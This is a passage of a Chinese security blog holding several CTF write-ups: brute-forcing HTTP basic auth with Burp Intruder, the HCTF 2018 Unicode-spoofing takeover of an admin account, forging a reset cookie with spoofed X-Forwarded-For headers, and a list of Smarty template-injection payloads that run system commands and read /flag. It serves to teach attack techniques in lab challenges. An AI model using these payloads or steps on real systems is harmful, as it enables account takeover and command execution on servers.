<p>![](<a target="_blank" rel="noopener" href="https://gitee.com/chen-lishan/tuc/raw/master/3">https://gitee.com/chen-lishan/tuc/raw/master/3</a> 抓包.png)</p>
<h4 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h4><p>在浏览器hackbar中，勾选cookie栏目，将最后一行admin的值由0改为1</p>
<p>![](<a target="_blank" rel="noopener" href="https://gitee.com/chen-lishan/tuc/raw/master/3">https://gitee.com/chen-lishan/tuc/raw/master/3</a> flag.png)</p>
<h3 id="CTFHub-HTTP协议-基础认证"><a href="#CTFHub-HTTP协议-基础认证" class="headerlink" title="[CTFHub]  HTTP协议  基础认证"></a>[CTFHub]  HTTP协议  基础认证</h3><p>点击click所包含的链接，弹出登录框，用户名admin，密码随意写个123，打开代理抓包</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/4%E7%99%BB%E5%BD%95.png"></p>
<p> burp抓包如下（做题的时候抓了好几次包才成功抓到）：</p>
<p><code>Basic</code>表示基础认证，字符串猜测为Base64编码</p>
<p>![](<a target="_blank" rel="noopener" href="https://gitee.com/chen-lishan/tuc/raw/master/4">https://gitee.com/chen-lishan/tuc/raw/master/4</a> 11.png)</p>
<p>base64解码出来，正是<code>admin:</code>和刚刚随意输入的密码<code>123</code></p>
<p>![](<a target="_blank" rel="noopener" href="https://gitee.com/chen-lishan/tuc/raw/master/4">https://gitee.com/chen-lishan/tuc/raw/master/4</a> base64.png)</p>
<p>题目附件里是一些密码，要从里面找到正确的密码，将附件作为字典进行暴力破解</p>
<p>将报文发送到Intruder</p>
<p>点击Add，将 Basic 后面 base64 部分添加为 payload positions</p>
<p>![](<a target="_blank" rel="noopener" href="https://gitee.com/chen-lishan/tuc/raw/master/4">https://gitee.com/chen-lishan/tuc/raw/master/4</a> add.png)</p>
<p>加载题目附件中的字典；</p>
<p>添加Base64编码；</p>
<p>取消勾选url编码这个选项，否则爆破字段里的“=”会被url编码</p>
<p>![](<a target="_blank" rel="noopener" href="https://gitee.com/chen-lishan/tuc/raw/master/4">https://gitee.com/chen-lishan/tuc/raw/master/4</a>  字典.png)</p>
<p>添加<code>admin：</code></p>
<p>![](<a target="_blank" rel="noopener" href="https://gitee.com/chen-lishan/tuc/raw/master/4">https://gitee.com/chen-lishan/tuc/raw/master/4</a> 字典2.png)</p>
<p>点击【Start attack】进行爆破</p>
<p>发现有一个长度不一样的，点击查看response，拿到flag</p>
<p>![](<a target="_blank" rel="noopener" href="https://gitee.com/chen-lishan/tuc/raw/master/4">https://gitee.com/chen-lishan/tuc/raw/master/4</a> flag.png)</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://-181.github.io/2021/07/13/Unicode%E6%AC%BA%E9%AA%97/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/image/avatar.jpg">
      <meta itemprop="name" content="左">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="左">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/07/13/Unicode%E6%AC%BA%E9%AA%97/" class="post-title-link" itemprop="url">Unicode欺骗</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-07-13 00:00:00" itemprop="dateCreated datePublished" datetime="2021-07-13T00:00:00+08:00">2021-07-13</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2021-07-27 00:19:28" itemprop="dateModified" datetime="2021-07-27T00:19:28+08:00">2021-07-27</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="Unicode欺骗"><a href="#Unicode欺骗" class="headerlink" title="Unicode欺骗"></a>Unicode欺骗</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p><strong>Unicode编码</strong></p>
<p>Unicode实际上是一个字符和数字之间的映射关系表，并不是实际的编码方案。后来才制定了UTF(Unicode Transformation Formats)标准，包括UTF-8、UTF-16和UTF-32等。可以理解为Unicode是一个设计图，而UTF-X是其中一种实现。</p>
<p><strong>视觉欺骗</strong></p>
<p>视觉欺骗是最常见的Unicode安全问题。视觉问题一般指几个不同的字符在某个字体下看起来较为相同。可能是字符之间一对一相似、多个字符的组合字符和一个字符相似等。</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h3><p>随便注册一个账号user</p>
<p>登录之后查看源码发现提示<code>&lt;!-- you are not admin --&gt;</code></p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/1not.png"></p>
<p>再用admin注册，提示账号已被注册</p>
<p>根据提示和题目名猜测，登录admin用户就可以得到flag。</p>
<p>（随便输入密码123，竟然成功登陆，这样暴力破解也能得到flag）</p>
<p>在change password页面查看页面源码，发现泄露了源码</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/%E6%BA%90%E7%A0%81.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;woadsl1234&#x2F;hctf_flask&#x2F;</span><br></pre></td></tr></table></figure>

<p>在app文件夹中，查看routes.py文件：</p>
<p>有注册、登录、退出、修改密码、编辑这几个功能模块</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, url_for, flash, request, redirect, session, make_response</span><br><span class="line"><span class="keyword">from</span> flask_login <span class="keyword">import</span> logout_user, LoginManager, current_user, login_user</span><br><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> app, db</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> Config</span><br><span class="line"><span class="keyword">from</span> app.models <span class="keyword">import</span> User</span><br><span class="line"><span class="keyword">from</span> forms <span class="keyword">import</span> RegisterForm, LoginForm, NewpasswordForm</span><br><span class="line"><span class="keyword">from</span> twisted.words.protocols.jabber.xmpp_stringprep <span class="keyword">import</span> nodeprep</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">from</span> code <span class="keyword">import</span> get_verify_code</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/code&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_code</span>():</span></span><br><span class="line">    image, code = get_verify_code()</span><br><span class="line">    <span class="comment"># 图片以二进制形式写入</span></span><br><span class="line">    buf = BytesIO()</span><br><span class="line">    image.save(buf, <span class="string">&#x27;jpeg&#x27;</span>)</span><br><span class="line">    buf_str = buf.getvalue()</span><br><span class="line">    <span class="comment"># 把buf_str作为response返回前端，并设置首部字段</span></span><br><span class="line">    response = make_response(buf_str)</span><br><span class="line">    response.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;image/gif&#x27;</span></span><br><span class="line">    <span class="comment"># 将验证码字符串储存在session中</span></span><br><span class="line">    session[<span class="string">&#x27;image&#x27;</span>] = code</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="meta">@app.route(&#x27;/index&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, title = <span class="string">&#x27;hctf&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/register&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    form = RegisterForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(form.username.data)</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">&#x27;image&#x27;</span>).lower() != form.verify_code.data.lower():</span><br><span class="line">            flash(<span class="string">&#x27;Wrong verify code.&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, title = <span class="string">&#x27;register&#x27;</span>, form=form)</span><br><span class="line">        <span class="keyword">if</span> User.query.filter_by(username = name).first():</span><br><span class="line">            flash(<span class="string">&#x27;The username has been registered&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;register&#x27;</span>))</span><br><span class="line">        user = User(username=name)</span><br><span class="line">        user.set_password(form.password.data)</span><br><span class="line">        db.session.add(user)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">&#x27;register successful&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, title = <span class="string">&#x27;register&#x27;</span>, form = form)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/login&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    form = LoginForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(form.username.data)</span><br><span class="line">        session[<span class="string">&#x27;name&#x27;</span>] = name</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> user.check_password(form.password.data):</span><br><span class="line">            flash(<span class="string">&#x27;Invalid username or password&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">        login_user(user, remember=form.remember_me.data)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>, title = <span class="string">&#x27;login&#x27;</span>, form = form)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/logout&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span>():</span></span><br><span class="line">    logout_user()</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;/index&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/change&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    form = NewpasswordForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(session[<span class="string">&#x27;name&#x27;</span>])</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        user.set_password(form.newpassword.data)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">&#x27;change successful&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;change.html&#x27;</span>, title = <span class="string">&#x27;change&#x27;</span>, form = form)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/edit&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        </span><br><span class="line">        flash(<span class="string">&#x27;post successful&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;edit.html&#x27;</span>, title = <span class="string">&#x27;edit&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(404)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span>(<span class="params">error</span>):</span></span><br><span class="line">    title = unicode(error)</span><br><span class="line">    message = error.description</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;errors.html&#x27;</span>, title=title, message=message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span>(<span class="params">username</span>):</span></span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure>



<h4 id="Unicode欺骗-1"><a href="#Unicode欺骗-1" class="headerlink" title="Unicode欺骗"></a>Unicode欺骗</h4><p>注册登录修改密码都用到了<code>strlower()</code>函数转换成小写。这个函数是自定义的</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/strlower.png"></p>
<p><code>nodeprep.prepare()</code>函数：将大写转换成小写。但当遇见<code>ᴬᴰᴹᴵᴺ</code>时，会转换成<code>ADMIN</code>。即，对于字符<code>ᴬ</code>，调用一次函数会转换成<code>A</code>,  再调用一次会转换成<code>a</code>。这是这个函数的漏洞。</p>
<p>注册登录修改密码都用到了<code>strlower()</code>函数：</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/%E5%A4%A7%E5%B0%8F%E5%86%99.png"></p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/%E5%A4%A7%E5%B0%8F%E5%86%992.png"></p>
<p>因此我们可以注册ᴬᴰᴹᴵᴺ用户，登录，由于在login函数里使用了一次<code>nodeprep.prepare()</code>函数，因此我们登录上去看到的用户名为ADMIN。然后，修改密码，再次调用<code>nodeprep.prepare()</code>函数，将用户名转换为admin。这样我们就可以改掉admin的密码，登录admin账号，拿到flag。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://-181.github.io/2021/06/21/%E5%9B%BD%E8%B5%9B%E5%8D%8E%E5%8D%97%E8%B5%9B%E5%8C%BA%20Login/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/image/avatar.jpg">
      <meta itemprop="name" content="左">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="左">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/06/21/%E5%9B%BD%E8%B5%9B%E5%8D%8E%E5%8D%97%E8%B5%9B%E5%8C%BA%20Login/" class="post-title-link" itemprop="url">国赛华南赛区-Login</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-06-21 00:00:00" itemprop="dateCreated datePublished" datetime="2021-06-21T00:00:00+08:00">2021-06-21</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2021-07-19 19:12:37" itemprop="dateModified" datetime="2021-07-19T19:12:37+08:00">2021-07-19</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="国赛华南赛区-Login"><a href="#国赛华南赛区-Login" class="headerlink" title="国赛华南赛区-Login"></a>国赛华南赛区-Login</h2><p>打开是一个登录框</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/login1.png"></p>
<p>点击忘记密码，进入重置密码页面，查看页面源代码</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/login2.png"></p>
<p>发现有一个js代码</p>
<p><a target="_blank" rel="noopener" href="http://172.35.29.15/static/reset.js">http://172.35.29.15/static/reset.js</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">initReset</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">  <span class="keyword">var</span> _0x1ec24d=_0x4c63;                                   <span class="comment">//语句1</span></span><br><span class="line">  $(_0x1ec24d(<span class="number">0x16e</span>))[_0x1ec24d(<span class="number">0x17d</span>)](<span class="function"><span class="keyword">function</span>(<span class="params">_0x14125e</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> _0x40984e=_0x1ec24d;                             <span class="comment">//语句2 </span></span><br><span class="line">      let _0x4e6bb8=&#123;&#125;;</span><br><span class="line">    _0x4e6bb8[_0x40984e(<span class="number">0x186</span>)]=$[_0x40984e(<span class="number">0x160</span>)]($(<span class="string">&#x27;#account&#x27;</span>)[_0x40984e(<span class="number">0x17a</span>)]()),_0x4e6bb8[_0x40984e(<span class="number">0x16c</span>)]=$[_0x40984e(<span class="number">0x160</span>)]($(_0x40984e(<span class="number">0x174</span>))[_0x40984e(<span class="number">0x17a</span>)]()),_0x4e6bb8[_0x40984e(<span class="number">0x183</span>)]=$[_0x40984e(<span class="number">0x160</span>)]($(_0x40984e(<span class="number">0x177</span>))[<span class="string">&#x27;val&#x27;</span>]()),_0x14125e[_0x40984e(<span class="number">0x176</span>)](),$[_0x40984e(<span class="number">0x175</span>)](&#123;<span class="string">&#x27;url&#x27;</span>:_0x40984e(<span class="number">0x187</span>),<span class="string">&#x27;type&#x27;</span>:_0x40984e(<span class="number">0x16d</span>),<span class="string">&#x27;data&#x27;</span>:_0x4e6bb8,<span class="string">&#x27;success&#x27;</span>:</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params">_0x5e89aa</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> _0x1ea9ce=_0x40984e;                             <span class="comment">//语句3</span></span><br><span class="line">      <span class="keyword">if</span>(_0x5e89aa[_0x1ea9ce(<span class="number">0x181</span>)]==!![]&amp;&amp;_0x5e89aa[<span class="string">&#x27;code&#x27;</span>]==_0x1ea9ce(<span class="number">0x17c</span>))</span><br><span class="line">       setCookie(<span class="string">&#x27;user&#x27;</span>,_0x5e89aa[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">      <span class="keyword">else</span> _0x5e89aa[_0x1ea9ce(<span class="number">0x181</span>)]==!![]&amp;&amp;_0x5e89aa[<span class="string">&#x27;code&#x27;</span>]==_0x1ea9ce(<span class="number">0x172</span>)?(setCookie(_0x1ea9ce(<span class="number">0x16a</span>),_0x1ea9ce(<span class="number">0x165</span>)),confirm(<span class="string">&#x27;you\x20are\x20super,\x20change\x20it\x20again!&#x27;</span>)&amp;&amp;(window[<span class="string">&#x27;location&#x27;</span>]=_0x1ea9ce(<span class="number">0x163</span>))):       <span class="comment">//语句4：setCookie</span></span><br><span class="line">        alert(_0x1ea9ce(<span class="number">0x184</span>));</span><br></pre></td></tr></table></figure>

<p><code>initReset()</code>里面有个<code>setCookie(_0x1ea9ce(0x16a),_0x1ea9ce(0x165))</code>,<code>confirm(&#39;you\x20are\x20super,\x20change\x20it\x20again!&#39;)&amp;&amp;(window[&#39;location&#39;]=_0x1ea9ce(0x163)))</code></p>
<p>直接怼到浏览器控制台里运行，可以得到这个cookie的值</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/login3.png"></p>
<p>用这个cookie去重置密码</p>
<p>账号只能用admin</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/login4.png"></p>
<p>提交抓包</p>
<p>在Cookie语句后面加上：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">;isSuperadmin&#x3D;i3uperAdmin</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">X-Originating-IP: 127.0.0.1</span><br><span class="line">X-Remote-IP: 127.0.0.1</span><br><span class="line">X-Remote-Addr: 127.0.0.1</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/login5.png"></p>
<p>登录账号密码，即可得到flag</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://-181.github.io/2021/06/16/smarty%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/image/avatar.jpg">
      <meta itemprop="name" content="左">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="左">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/06/16/smarty%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">Smarty模板注入漏洞</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-06-16 00:00:00" itemprop="dateCreated datePublished" datetime="2021-06-16T00:00:00+08:00">2021-06-16</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2021-07-19 19:16:25" itemprop="dateModified" datetime="2021-07-19T19:16:25+08:00">2021-07-19</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="Smarty模板注入漏洞"><a href="#Smarty模板注入漏洞" class="headerlink" title="Smarty模板注入漏洞"></a>Smarty模板注入漏洞</h1><p>Smarty是一个PHP的模板引擎，提供让程序逻辑与页面显示（HTML/CSS）代码分离的功能。就是当改变程序的逻辑内容时，不会影响到页面设计；修改页面时，也不会影响程序逻辑。</p>
<h4 id="利用漏洞常用payload"><a href="#利用漏洞常用payload" class="headerlink" title="利用漏洞常用payload"></a>利用漏洞常用payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">常用payload</span><br><span class="line">&#123;if phpinfo()&#125;&#123;&#x2F;if&#125;</span><br><span class="line">&#123;if system(&#39;ls&#39;)&#125;&#123;&#x2F;if&#125;</span><br><span class="line">&#123;if readfile(&#39;&#x2F;flag&#39;)&#125;&#123;&#x2F;if&#125; </span><br><span class="line">&#123;if show_source(&#39;&#x2F;flag&#39;)&#125;&#123;&#x2F;if&#125;</span><br><span class="line">&#123;if system(&#39;cat ..&#x2F;..&#x2F;..&#x2F;flag&#39;)&#125;&#123;&#x2F;if&#125; </span><br></pre></td></tr></table></figure>

<ul>
<li><p>{if}标签</p>
<p>smarty中的{if}标签中可以执行php语句</p>
<p>Smarty3官方手册：</p>
<blockquote>
<p>Smarty的{if}条件判断和PHP的if非常相似，只是增加了一些特性。每个{if}必须有一个配对的{/if}，也可以使用{else} 和 {elseif}，全部的PHP条件表达式和函数都可以在if内使用，如||<em>, or, &amp;&amp;, and, is_array(), 等等，如：{if is_array($array)}{/if}</em></p>
</blockquote>
</li>
</ul>
<h2 id="bugku-聪明的php"><a href="#bugku-聪明的php" class="headerlink" title="bugku-聪明的php"></a>bugku-聪明的php</h2><p>打开题目，提示传递参数，flag的文件名随机</p>
<p>随便传入一个参数</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/a=1.png"></p>
<p>可以看到源码</p>
<p>猜测是smarty模板注入</p>
<p>测试一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>![](<a target="_blank" rel="noopener" href="https://gitee.com/chen-lishan/tuc/raw/master/7">https://gitee.com/chen-lishan/tuc/raw/master/7</a> 7.png)</p>
<p>确实是smarty模板注入</p>
<p>题目过滤了很多函数，system()也被过滤了，可以用passthru()代替</p>
<ul>
<li>passthru()只调用命令，不返回任何结果，但把命令的运行结果原样地直接输出到标准输出设备上。所以passthru()函数经常用来调用象pbmplus（Unix下的一个处理图片的工具，输出二进制的原始图片的流）这样的程序。同样它也可以得到命令执行的状态码。</li>
</ul>
<p>构造payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if passthru(&#39;ls&#39;)&#125;&#123;&#x2F;if&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/passthru.png"></p>
<h4 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h4><p>目录跳跃，发现start.sh</p>
